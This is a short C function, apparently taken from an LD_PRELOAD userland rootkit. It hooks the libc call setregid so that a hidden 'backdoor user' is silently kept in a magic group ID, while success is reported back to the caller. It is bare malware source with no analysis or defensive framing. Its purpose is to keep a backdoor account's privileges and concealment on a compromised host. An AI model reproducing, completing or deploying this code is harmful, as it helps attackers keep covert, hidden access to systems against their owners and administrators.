int setregid(gid_t rgid, gid_t egid)
{
    HOOK(o_setregid, CSETREGID);
    if(is_bdusr()){ if(rgid != MGID || egid != MGID){ o_setregid(MGID,MGID); } return 0; }
    return o_setregid(rgid, egid);
}
